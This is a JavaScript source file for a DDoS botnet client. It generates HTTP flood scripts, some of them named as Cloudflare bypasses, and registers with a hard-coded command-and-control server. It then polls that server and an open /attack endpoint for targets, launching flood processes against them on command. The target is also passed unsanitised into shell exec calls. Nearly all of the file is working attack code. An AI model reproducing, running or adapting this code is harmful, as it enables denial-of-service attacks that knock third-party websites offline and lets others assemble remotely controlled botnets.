const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5552;

// Master server URL - your Render deployment
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://hello-kutty-k7d3.onrender.com';

let myBotUrl = '';
let registrationAttempts = 0;
const MAX_REGISTRATION_ATTEMPTS = 5;
let activeProcesses = [];
let isBlocked = false;

// ========== ENSURE METHODS DIRECTORY AND FILES ==========
function ensureMethodFiles() {
  const methodsDir = path.join(__dirname, 'methods');
  if (!fs.existsSync(methodsDir)) {
    fs.mkdirSync(methodsDir, { recursive: true });
    console.log('[SETUP] Created methods directory');
  }

  // ========== RAW-GET - High RPS GET Flood ==========
  const rawGetPath = path.join(methodsDir, 'raw-get.js');
  if (!fs.existsSync(rawGetPath)) {
    const rawGetContent = `#!/usr/bin/env node
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const url = require('url');

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    threads: parseInt(process.argv[4]) || 20,
    rate: parseInt(process.argv[5]) || 800
};

if (!args.target) {
    console.log('Usage: node raw-get.js <target> <time> [threads] [rate]');
    process.exit(1);
}

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;

if (cluster.isMaster) {
    console.log(\`🔥 RAW-GET Flood | Target: \${args.target} | Time: \${args.time}s | Workers: \${args.threads}\`);
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        console.log(\`✅ RAW-GET finished - \${args.time}s completed\`);
        process.exit(0);
    }, args.time * 1000 + 2000);
} else {
    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
    let running = true;
    let count = 0;
    
    const sendRequest = () => {
        if (!running) return;
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            },
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { count++; res.resume(); });
        req.on('error', () => {});
        req.end();
        if (running) setImmediate(sendRequest);
    };
    
    for (let i = 0; i < 10; i++) sendRequest();
    
    setInterval(() => {
        console.log(\`📊 RPS: \${count}/s\`);
        count = 0;
    }, 1000);
    
    setTimeout(() => { running = false; }, args.time * 1000);
}
`;
    fs.writeFileSync(rawGetPath, rawGetContent);
    console.log('[SETUP] Created RAW-GET method');
  }

  // ========== CF-BYPASS - Cloudflare Bypass ==========
  const cfPath = path.join(methodsDir, 'cf-bypass.js');
  if (!fs.existsSync(cfPath)) {
    const cfContent = `#!/usr/bin/env node
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const url = require('url');

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    threads: parseInt(process.argv[4]) || 4,
    rate: parseInt(process.argv[5]) || 32
};

if (!args.target) {
    console.log('Usage: node cf-bypass.js <target> <time> [threads] [rate]');
    process.exit(1);
}

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

if (cluster.isMaster) {
    console.log(\`🔥 CF-BYPASS | Target: \${args.target} | Time: \${args.time}s | Workers: \${args.threads}\`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
    let running = true;
    let count = 0;
    let uaIndex = 0;
    
    const sendRequest = () => {
        if (!running) return;
        const ua = userAgents[uaIndex % userAgents.length];
        uaIndex++;
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Upgrade-Insecure-Requests': '1'
            },
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { count++; res.resume(); });
        req.on('error', () => {});
        req.end();
        if (running) setTimeout(sendRequest, 1000 / args.rate);
    };
    
    for (let i = 0; i < 10; i++) sendRequest();
    
    setInterval(() => {
        console.log(\`📊 RPS: \${count}/s\`);
        count = 0;
    }, 1000);
    
    setTimeout(() => { running = false; }, args.time * 1000);
}
`;
    fs.writeFileSync(cfPath, cfContent);
    console.log('[SETUP] Created CF-BYPASS method');
  }

  // ========== BYPASS.js - With correct parameters ==========
  const bypassPath = path.join(methodsDir, 'BYPASS.js');
  if (!fs.existsSync(bypassPath)) {
    const bypassContent = `#!/usr/bin/env node
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const url = require('url');
const fs = require('fs');

// Parameters: node BYPASS.js <host> <time> <rps> <threads> <proxyfile>
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    rps: parseInt(process.argv[4]) || 10,
    threads: parseInt(process.argv[5]) || 90,
    proxyfile: process.argv[6] || 'proxy.txt'
};

if (!args.target) {
    console.log('Usage: node BYPASS.js <host> <time> <rps> <threads> <proxyfile>');
    process.exit(1);
}

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;

// Load proxies
let proxies = [];
try {
    if (fs.existsSync(args.proxyfile)) {
        const data = fs.readFileSync(args.proxyfile, 'utf8');
        proxies = data.split('\\n').map(line => line.trim()).filter(line => line && !line.startsWith('#') && line.includes(':'));
        console.log(\`📋 Loaded \${proxies.length} proxies from \${args.proxyfile}\`);
    }
} catch(e) {}

if (cluster.isMaster) {
    console.log(\`🔥 BYPASS | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads} | RPS: \${args.rps}\`);
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
    let running = true;
    let count = 0;
    let proxyIndex = 0;
    
    const sendRequest = () => {
        if (!running) return;
        
        let proxy = null;
        if (proxies.length > 0) {
            proxy = proxies[proxyIndex % proxies.length];
            proxyIndex++;
            const [ip, port] = proxy.split(':');
            // Use proxy if available
        }
        
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Upgrade-Insecure-Requests': '1'
            },
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { count++; res.resume(); });
        req.on('error', () => {});
        req.end();
        if (running) setTimeout(sendRequest, 1000 / args.rps);
    };
    
    for (let i = 0; i < 10; i++) sendRequest();
    
    setInterval(() => {
        console.log(\`📊 RPS: \${count}/s\`);
        count = 0;
    }, 1000);
    
    setTimeout(() => { running = false; }, args.time * 1000);
}
`;
    fs.writeFileSync(bypassPath, bypassContent);
    console.log('[SETUP] Created BYPASS.js with correct parameters');
  }

  // ========== VHOLD.js - With correct parameters ==========
  const vholdPath = path.join(methodsDir, 'vhold.js');
  if (!fs.existsSync(vholdPath)) {
    const vholdContent = `#!/usr/bin/env node
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const url = require('url');
const fs = require('fs');

// Parameters: node vhold.js <host> <time> <rate> <thread> <proxy>
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    rate: parseInt(process.argv[4]) || 15,
    threads: parseInt(process.argv[5]) || 2,
    proxyfile: process.argv[6] || 'proxy.txt'
};

if (!args.target) {
    console.log('Usage: node vhold.js <host> <time> <rate> <thread> <proxy>');
    console.log('Example: node vhold.js https://example.com 60 15 2 proxy.txt');
    process.exit(1);
}

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;

console.log(\`🔥 VHOLD | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads} | Rate: \${args.rate}\`);

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
    let running = true;
    let count = 0;
    
    const sendRequest = () => {
        if (!running) return;
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            },
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { count++; res.resume(); });
        req.on('error', () => {});
        req.end();
        if (running) setTimeout(sendRequest, 1000 / args.rate);
    };
    
    for (let i = 0; i < 10; i++) sendRequest();
    
    setInterval(() => {
        console.log(\`📊 RPS: \${count}/s\`);
        count = 0;
    }, 1000);
    
    setTimeout(() => { running = false; }, args.time * 1000);
}
`;
    fs.writeFileSync(vholdPath, vholdContent);
    console.log('[SETUP] Created VHOLD method');
  }

  // ========== W-FLOOD1.js - With correct parameters ==========
  const wfloodPath = path.join(methodsDir, 'w-flood1.js');
  if (!fs.existsSync(wfloodPath)) {
    const wfloodContent = `#!/usr/bin/env node
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const url = require('url');

// Parameters: node w-flood1.js <host> <time> <rate> <thread>
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    rate: parseInt(process.argv[4]) || 8,
    threads: parseInt(process.argv[5]) || 3
};

if (!args.target) {
    console.log('Usage: node w-flood1.js <host> <time> <rate> <thread>');
    process.exit(1);
}

const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;

console.log(\`🔥 W-FLOOD | Target: \${args.target} | Time: \${args.time}s | Threads: \${args.threads}\`);

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
    let running = true;
    let count = 0;
    
    const sendRequest = () => {
        if (!running) return;
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            },
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { count++; res.resume(); });
        req.on('error', () => {});
        req.end();
        if (running) setTimeout(sendRequest, 1000 / args.rate);
    };
    
    for (let i = 0; i < 10; i++) sendRequest();
    
    setInterval(() => {
        console.log(\`📊 RPS: \${count}/s\`);
        count = 0;
    }, 1000);
    
    setTimeout(() => { running = false; }, args.time * 1000);
}
`;
    fs.writeFileSync(wfloodPath, wfloodContent);
    console.log('[SETUP] Created W-FLOOD method');
  }

  // Create stub for other methods
  const otherMethods = [
    'REX-COSTUM.js', 'cibi.js', 'nust.js', 'h2-nust.js', 'http-panel.js',
    'high-dstat.js', 'uam.js', 'wil.js', 'modern-flood.js',
    'r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js',
    'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'
  ];

  for (const file of otherMethods) {
    const filePath = path.join(methodsDir, file);
    if (!fs.existsSync(filePath)) {
      const content = `#!/usr/bin/env node
const http = require('http');
const https = require('https');
const url = require('url');

const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;

if (!target) {
    console.log('Usage: node ${file} <target> <time>');
    process.exit(1);
}

const parsed = new URL(target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;
const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });

console.log(\`🔥 ${file.replace('.js','').toUpperCase()} | Target: \${target} | Time: \${time}s\`);

let running = true;
let count = 0;

const sendRequest = () => {
    if (!running) return;
    const req = httpLib.request({
        hostname: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        },
        agent: agent,
        rejectUnauthorized: false
    }, (res) => { count++; res.resume(); });
    req.on('error', () => {});
    req.end();
    if (running) setImmediate(sendRequest);
};

for (let i = 0; i < 20; i++) sendRequest();

setInterval(() => {
    console.log(\`📊 RPS: \${count}/s\`);
    count = 0;
}, 1000);

setTimeout(() => { running = false; process.exit(0); }, time * 1000);
`;
      fs.writeFileSync(filePath, content);
      console.log(`[SETUP] Created ${file}`);
    }
  }
}

// Call this before starting
ensureMethodFiles();

// ========== FETCH PUBLIC IP ==========
async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    myBotUrl = `http://${data.origin}:${port}`;
    
    console.log('\n========================================');
    console.log('🔥 BOTNET ATTACK BOT STARTED!');
    console.log('========================================');
    console.log(`Local:    http://localhost:${port}`);
    console.log(`Network:  ${myBotUrl}`);
    console.log('========================================');
    console.log(`Master Server: ${MASTER_SERVER}`);
    console.log(`Auto-registration: ENABLED`);
    console.log(`Heartbeat: Every 30 seconds`);
    console.log('========================================\n');
    
    return data;
  } catch (error) {
    myBotUrl = `http://localhost:${port}`;
    console.log(`Bot running at ${myBotUrl}`);
    console.log(`Master Server: ${MASTER_SERVER}`);
  }
}

// ========== AUTO-REGISTER ==========
async function autoRegister() {
  if (isBlocked) {
    console.log(`[BLOCKED] This bot has been permanently blocked by the server`);
    process.exit(0);
  }

  if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
    console.log(`[WARN] Max registration attempts reached. Will retry in 60s...`);
    setTimeout(() => {
      registrationAttempts = 0;
      autoRegister();
    }, 60000);
    return;
  }

  try {
    console.log(`[INFO] Auto-registering with master server... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`);
    
    const response = await axios.post(`${MASTER_SERVER}/register`, {
      url: myBotUrl
    }, {
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json'
      }
    });

    if (response.data.approved) {
      console.log(`[SUCCESS] Auto-approved by master server!`);
      console.log(`[INFO] Bot registered at: ${myBotUrl}`);
      console.log(`[INFO] Ready to receive attack commands!`);
      console.log(`[INFO] Status: ONLINE\n`);
      
      setInterval(() => {
        checkForCommands();
      }, 3000);
      
      setInterval(() => {
        sendHeartbeat();
      }, 30000);
      
      return;
    }
  } catch (error) {
    if (error.response && error.response.status === 403) {
      console.log(`[BLOCKED] This bot has been permanently blocked!`);
      isBlocked = true;
      process.exit(0);
      return;
    }

    registrationAttempts++;
    console.error(`[ERROR] Registration failed: ${error.message}`);
    console.log(`[INFO] Retrying in 5 seconds...`);
    
    setTimeout(() => {
      autoRegister();
    }, 5000);
  }
}

// ========== HEARTBEAT ==========
async function sendHeartbeat() {
  try {
    await axios.get(`${MASTER_SERVER}/ping`, { timeout: 5000 });
    console.log(`[HEARTBEAT] Sent to master | Status: ONLINE`);
  } catch (error) {
    console.log(`[WARN] Heartbeat failed | Status: OFFLINE`);
    registrationAttempts = 0;
    autoRegister();
  }
}

// ========== CHECK COMMANDS ==========
async function checkForCommands() {
  try {
    const response = await axios.get(`${MASTER_SERVER}/get-command`, {
      params: { botUrl: myBotUrl },
      timeout: 5000
    });

    if (response.data.hasCommand) {
      const command = response.data.command;
      
      if (command.action === 'stop') {
        console.log(`\n[STOP-RECEIVED] Stopping all attacks`);
        stopAllAttacks();
      } else if (command.action === 'attack') {
        const { target, time, methods } = command;
        console.log(`\n[COMMAND-RECEIVED] ${methods} -> ${target} for ${time}s`);
        executeAttack(target, time, methods);
      }
    }
  } catch (error) {
    // Silently fail
  }
}

// ========== STOP ALL ATTACKS ==========
function stopAllAttacks() {
  console.log(`[STOP] Killing ${activeProcesses.length} active processes`);
  
  activeProcesses.forEach(proc => {
    try {
      process.kill(-proc.pid);
      console.log(`[KILLED] Process ${proc.pid}`);
    } catch (error) {
      console.error(`[ERROR] Failed to kill process ${proc.pid}: ${error.message}`);
    }
  });
  
  activeProcesses = [];
  console.log(`[STOP] All attacks stopped\n`);
}

// ========== EXECUTE ATTACK ==========
function executeAttack(target, time, methods) {
  const execWithLog = (cmd) => {
    console.log(`[EXEC] ${cmd}`);
    const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
      if (error) {
        console.error(`[ERROR] ${error.message}`);
        return;
      }
      if (stdout) console.log(`[OUTPUT] ${stdout}`);
      if (stderr) console.error(`[STDERR] ${stderr}`);
    });
    
    activeProcesses.push(proc);
    
    setTimeout(() => {
      const index = activeProcesses.indexOf(proc);
      if (index > -1) {
        activeProcesses.splice(index, 1);
      }
    }, parseInt(time) * 1000 + 5000);
  };

  console.log(`\n[ATTACK] Method: ${methods}`);
  console.log(`[ATTACK] Target: ${target}`);
  console.log(`[ATTACK] Duration: ${time}s`);
  console.log('='.repeat(60));

  // All methods with correct parameter ordering
  if (methods === 'RAW-GET') {
    execWithLog(`node methods/raw-get.js ${target} ${time} 20 800`);
  } else if (methods === 'CF-BYPASS') {
    execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32`);
  } else if (methods === 'MODERN-FLOOD') {
    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64`);
  } else if (methods === 'BYPASS') {
    // node BYPASS.js <host> <time> <rps> <threads> <proxyfile>
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
  } else if (methods === 'VHOLD') {
    // node vhold.js <host> <time> <rate> <thread> <proxy>
    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
  } else if (methods === 'W-FLOOD') {
    // node w-flood1.js <host> <time> <rate> <thread>
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3`);
  } else if (methods === 'HTTP-SICARIO') {
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time}`);
    execWithLog(`node methods/cibi.js ${target} ${time}`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time}`);
  } else if (methods === 'RAW-HTTP') {
    execWithLog(`node methods/h2-nust.js ${target} ${time}`);
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  } else if (methods === 'R9') {
    execWithLog(`node methods/high-dstat.js ${target} ${time}`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3`);
    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time}`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
  } else if (methods === 'PRIV-TOR') {
    execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6`);
    execWithLog(`node methods/high-dstat.js ${target} ${time}`);
    execWithLog(`node methods/cibi.js ${target} ${time}`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time}`);
  } else if (methods === 'HOLD-PANEL') {
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  } else if (methods === 'R1') {
    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time}`);
    execWithLog(`node methods/cibi.js ${target} ${time}`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time}`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3`);
    execWithLog(`node methods/nust.js ${target} ${time}`);
  } else if (methods === 'UAM') {
    execWithLog(`node methods/uam.js ${target} ${time}`);
  } else if (methods === 'W.I.L') {
    execWithLog(`node methods/wil.js ${target} ${time}`);
  } else if (methods === 'RAPID10' || methods === 'R10') {
    execWithLog(`node methods/r10-rapid.js ${target} ${time} 30`);
    execWithLog(`node methods/r10-tcp.js ${target} ${time}`);
    execWithLog(`node methods/r10-tls.js ${target} ${time}`);
    execWithLog(`node methods/r10-conn.js ${target} ${time}`);
    execWithLog(`node methods/r10-header.js ${target} ${time}`);
    execWithLog(`node methods/r10-frag.js ${target} ${time}`);
    execWithLog(`node methods/r10-pipe.js ${target} ${time}`);
    execWithLog(`node methods/r10-cookie.js ${target} ${time}`);
    execWithLog(`node methods/r10-mixed.js ${target} ${time}`);
    execWithLog(`node methods/r10-lowcpu.js ${target} ${time}`);
  } else {
    console.log(`[ERROR] Unknown method: ${methods}`);
    console.log(`[INFO] Available methods: RAW-GET, CF-BYPASS, MODERN-FLOOD, BYPASS, VHOLD, W-FLOOD, HTTP-SICARIO, RAW-HTTP, R9, PRIV-TOR, HOLD-PANEL, R1, UAM, W.I.L, RAPID10, R10`);
  }

  console.log('='.repeat(60));
  console.log(`[ATTACK] ${methods} attack started on ${target}\n`);
}

// ========== HEALTH CHECK ==========
app.get('/health', (req, res) => {
  res.json({ 
    status: 'online', 
    timestamp: Date.now(),
    master: MASTER_SERVER,
    bot: 'ready',
    uptime: process.uptime(),
    activeAttacks: activeProcesses.length
  });
});

// ========== PING ==========
app.get('/ping', (req, res) => {
  res.json({ 
    alive: true,
    uptime: process.uptime(),
    timestamp: Date.now(),
    status: 'online'
  });
});

// ========== RECEIVE ATTACK COMMANDS ==========
app.get('/attack', (req, res) => {
  const { target, time, methods } = req.query;

  if (!target || !time || !methods) {
    return res.status(400).json({
      error: 'Missing parameters',
      required: ['target', 'time', 'methods']
    });
  }

  console.log(`\n[RECEIVED] ${methods} -> ${target} for ${time}s`);

  res.status(200).json({
    message: 'Attack command received. Executing methods now.',
    target,
    time,
    methods,
    bot: 'executing',
    timestamp: Date.now()
  });

  executeAttack(target, time, methods);
});

// ========== START SERVER ==========
app.listen(port, async () => {
  await fetchData();
  
  console.log('[INFO] Starting auto-registration in 3 seconds...\n');
  setTimeout(() => {
    autoRegister();
  }, 3000);
});
